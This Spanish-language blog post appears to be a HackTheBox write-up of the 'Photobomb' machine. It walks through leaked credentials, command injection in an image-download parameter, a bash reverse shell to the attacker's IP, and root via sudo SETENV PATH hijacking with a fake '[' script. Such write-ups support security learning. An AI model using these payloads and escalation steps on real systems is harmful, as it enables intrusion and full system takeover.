---
layout: post
title:  "Writeup - Photobomb"
description: "Resolución de la máquina Photobomb de HackTheBox."
tags: ['HackTheBox', 'Command Injection', 'Code Analysis', '$PATH Hijacking']
type: writeup
machine_name: photobomb
---

En esta máquina Linux haremos un analisis de código en el cual encontraremos credenciales y con ellas accederemos a un panel de imágenes vulnerable a Command Injection. Luego nos convertiremos en root abusando de la posibilidad de establecer las variables de entorno al cambiar de usuario con sudo (SETENV).

<h2>RECONOCIMIENTO</h2>

Con un escaneo de Nmap vemos que la máquina solo tiene dos puertos abiertos:

{% highlight bash %}
# Nmap 7.93 scan initiated Tue Feb 14 20:53:27 2023 as: nmap -sS -Pn -vvv --min-rate 100 -oN ports 10.10.11.182
Nmap scan report for 10.10.11.182
Host is up, received user-set (0.12s latency).
Scanned at 2023-02-14 20:53:27 -04 for 4s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Tue Feb 14 20:53:31 2023 -- 1 IP address (1 host up) scanned in 3.86 seconds
{% endhighlight %}

El puerto 80 nos redirigue al dominio photobomb.htb; el sitio que se encuentra
es algo anticuado:

![Website](/assets/writeups/photobomb/1.png)

Nos dice que pronto estaremos generando ingresos vendiendo "regalos fotográficos premium" con esta
aplicación web de "tecnología de punta".

El enlace para empezar nos manda a la ruta /printer, pero al entrar nos pide credenciales de tipo HTTP Basic:

![No credentials](/assets/writeups/photobomb/2.png)


Ya toca ir buscando por donde entrar.

<h2>INTRUSIÓN</h2>

Si analizamos el código de la página web encontraremos un script que parece que la página no utiliza, porque no se ve uso de JavaScript en ninguna parte del documento HTML.

![Strange script](/assets/writeups/photobomb/3.png)

Viendo el script, parece que hay algo muy tocho:

Hay un comentario que dice "rellenar las credenciales para el soporte técnico ya que viven olvidandolas y enviándome correos" junto a una validación de cookie la cual si es exitosa, va a cambiar el atributo href de un elemento con class "creds" a un enlace que parece contener las credenciales para acceder a /printer

{% highlight javascript %}
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
{% endhighlight %}

Si las probamos, el sitio nos concederá el acceso y tendremos otra sección de la web; una utilidad para
descargar imágenes:

![Printer](/assets/writeups/photobomb/4.png)

Seleccionando imágenes y descargándolas, al interceptar las peticiones vemos los siguientes parametros enviados por POST:

```
photo=finn-whelen-DTfhsDIWNSg-unsplash.jpg&filetype=jpg&dimensions=3000x2000
```

Si modificamos el nombre de uno de los parametros (en este caso `dimensions`), el sitio nos mostrará un error de Sinatra (El framework que utiliza el sitio web para correr):

![Error](/assets/writeups/photobomb/5.png)

El error nos muestra una porción del código de la página; vemos que está haciendo una validación al parametro `dimensions` y a la extensión del archivo, y si bajamos un poco más veremos las variables de 
entorno de Rack.

Si hacemos lo mismo con `photo` nos muestra un poco más del código:

{% highlight ruby %}
post '/printer' do
  photo = params[:photo]
  filetype = params[:filetype]
  dimensions = params[:dimensions]

  # handle inputs

  if photo.match(/\.{2}|\//)
    halt 500, 'Invalid photo.'
  end

  if !FileTest.exist?( "source_images/" + photo )
    halt 500, 'Source photo does not exist.'
  end
{% endhighlight %}

Podemos ver que está verificando que la foto no tenga ningún caracter para retroceder/cambiar directorios (../ o /) y que esta exista en el directorio `source_images`. 

Primeramente se ve que no podremos hacer que el sitio nos carge otros archivos retrocediendo directorios o especificandole una ruta absoluta, pero no vemos por ningún lado que filtre o verifique otros carácteres extraños, y también podemos pensar que el sitio está ejecutando algún comando con los parametros que le pasamos.

Si probamos a introducir un patrón de inyección de comandos con ping en los parametros, parece que en uno funciona:

```
photo=finn-whelen-DTfhsDIWNSg-unsplash.jpg&filetype=jpg;+ping+-c+1+10.10.14.21&dimensions=3000x2000
```

![Error](/assets/writeups/photobomb/6.png)

El parametro `filetype` es vulnerable a inyección de comandos.

Ahora obtengamos acceso al sistema con una reverse shell:

```
photo=finn-whelen-DTfhsDIWNSg-unsplash.jpg&filetype=jpg;bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.21/443+0>%261"&dimensions=3000x2000
```

{% highlight bash %}
❯ nc -lvnp 443
Connection from 10.10.11.182:39576
bash: cannot set terminal process group (731): Inappropriate ioctl for device
bash: no job control in this shell
wizard@photobomb:~/photobomb$ script /dev/null -c bash #Iniciar un nuevo proceso
script /dev/null -c bash
Script started, file is /dev/null
wizard@photobomb:~/photobomb$ ^Z # CTRL + Z
[1]  + 8086 suspended  nc -lvnp 443
❯ stty raw -echo; fg #Establecer ciertas opciones de la tty
[1]  + 8086 continued  nc -lvnp 443
                                   reset xterm #Inicializar terminal

wizard@photobomb:~$ export TERM=xterm #Establecer el tipo de terminal
wizard@photobomb:~$ stty rows 37 columns 151 #Establecer filas y columnas de la tty
{% endhighlight %}

Ya estando dentro del sistema podremos ver la primera flag:

{% highlight bash %}
wizard@photobomb:~/photobomb$ ls
log  photobomb.sh  public  resized_images  server.rb  source_images
wizard@photobomb:~/photobomb$ cd ..
wizard@photobomb:~$ ls
photobomb  user.txt
wizard@photobomb:~$ cat user.txt
3d63374bfeba83ea141c***********
wizard@photobomb:~$ 
{% endhighlight %}

Ahora es tiempo de tomar control del usuario root.

<h2>ESCALADA DE PRIVILEGIOS</h2>

Si miramos nuestros privilegios asignados en sudoers, encontramos esto:

{% highlight bash %}
wizard@photobomb:~$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
{% endhighlight %}

Podemos ejecutar como root el script cleanup.sh sin necesidad de introducir la contraseña y controlando
las variables de entorno.

Mirando el código del script mencionado anteriormente, vemos que utiliza `find` sin una
ruta absoluta:

{% highlight bash %}
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
{% endhighlight %}

Tambien podemos ver que carga un .bashrc distinto al del usuario wizard y el almacenado en /etc/ 
por la siguiente linea:

{% highlight bash %}
# Jameson: caused problems with testing whether to rotate the log file
enable -n [ # ]
{% endhighlight %}

Este comando extraño tiene su explicación:

Bash usa el comando `test` para comprobar si una expresión es verdadera o falsa, y este comando tiene
sus alias.

Si husmeamos o llegamos a husmear en Linux nos habremos dado cuenta de que existe un fichero en /bin llamado `[`:

{% highlight bash %}
❯ file "/bin/["
/bin/[: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8de289b0bac2aa6dfdc7dac2045c64c66f53043f, for GNU/Linux 4.4.0, stripped
{% endhighlight %}

Pues este fichero es el mismo comando `test` solo que es un alias (con este alias debes finalizar la expresión con un `]`), pero sucede que Bash lo tiene definido dentro de si mismo; es un built-in (puedes hasta usarlo teniendo el $PATH completamente vacio):

{% highlight bash %}
> vzon@pwnedz0n: ~$ which [
/usr/bin/[
> vzon@pwnedz0n: ~$ [ 1 -eq 1 ]
> vzon@pwnedz0n: ~$ echo $?
0 # 1 es igual a 1
> vzon@pwnedz0n: ~$ export PATH=""
> vzon@pwnedz0n: ~$ which [
bash: which: No existe el fichero o el directorio
> vzon@pwnedz0n: ~$ [ 1 -eq 1 ]
> vzon@pwnedz0n: ~$ echo $?
0
> vzon@pwnedz0n: ~$ 
{% endhighlight %}

Lo que hace `enable -n` es desactivar ese built-in de Bash, forzándolo a utilizar el binario que se encuentre en el $PATH o directorio actual

{% highlight bash %}
> vzon@pwnedz0n: ~$ [ 1 -eq 1 ]
> vzon@pwnedz0n: ~$ echo $?
0
> vzon@pwnedz0n: ~$ cat '/home/vzon/['
#!/bin/bash
/bin/date
> vzon@pwnedz0n: ~$ enable -n [
> vzon@pwnedz0n: ~$ export PATH=""
> vzon@pwnedz0n: ~$ [ 1 -eq 1 ]
mié 15 feb 2023 15:12:29 -04
> vzon@pwnedz0n: ~$ 
{% endhighlight %}

Sabiendo esto, se vio que el script comprueba que el fichero `photobomb.log` no sea un enlace simbolico y que no este vacio usando el `[`, asi que podemos crear un fichero en nuestra ruta con el mismo nombre y agregarlo al principio de $PATH al ejecutarlo con sudo:

{% highlight bash %}
wizard@photobomb:/dev/shm$ cat '['
#!/bin/bash
bash
wizard@photobomb:/dev/shm$ chmod +x '['
wizard@photobomb:/dev/shm$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
root@photobomb:/dev/shm#
{% endhighlight %}

Ahora simplemente tomamos la última flag

{% highlight bash %}
root@photobomb:~# ls
root.txt
root@photobomb:~# cat root.txt
3c7ab9a614efe315b0475***********
root@photobomb:~# 
{% endhighlight %}

<h2>EXTRA</h2>

Hablando de que el script no ejecuta `find` con la ruta absoluta, podrías hacer lo mismo que con `[`:

{% highlight bash %}
wizard@photobomb:/dev/shm$ cat find
#!/bin/bash
bash
wizard@photobomb:/dev/shm$ chmod +x find
wizard@photobomb:/dev/shm$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
root@photobomb:/dev/shm#
{% endhighlight %}

La inyección de comandos ocurre por la siguiente parte del bloque de /printer:

{% highlight ruby %}
  filename = photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype
  response['Content-Disposition'] = "attachment; filename=#{filename}"

  if !File.exists?('resized_images/' + filename)
    command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename
    puts "Executing: #{command}"
    system(command)
  else
    puts "File already exists."
  end

  if File.exists?('resized_images/' + filename)
    halt 200, {}, IO.read('resized_images/' + filename)
  end

  #message = 'Failed to generate a copy of ' + photo + ' resized to ' + dimensions + ' with filetype ' + filetype
  message = 'Failed to generate a copy of ' + photo
  halt 500, message
end
{% endhighlight %}

Toma el parametro `filetype`, se lo agrega a la variable `filename` y ejecuta un comando con la 
variable. El comando se ejecutaría de la siguiente forma:

`convert source_images/my_image.jpg -resize 3000x2000 resized_images/my_image_3000x2000.png`

Al no validar correctamente `filetype`, se convertiría en esto si intentaramos inyectar un comando:

`convert source_images/my_image.jpg -resize 3000x2000 resized_images/my_image_3000x2000.png; ping -c 1 10.10.14.21`

y esta sintaxis es válida en Linux, asi que se ejecutaría el segundo comando sin ningún problema.
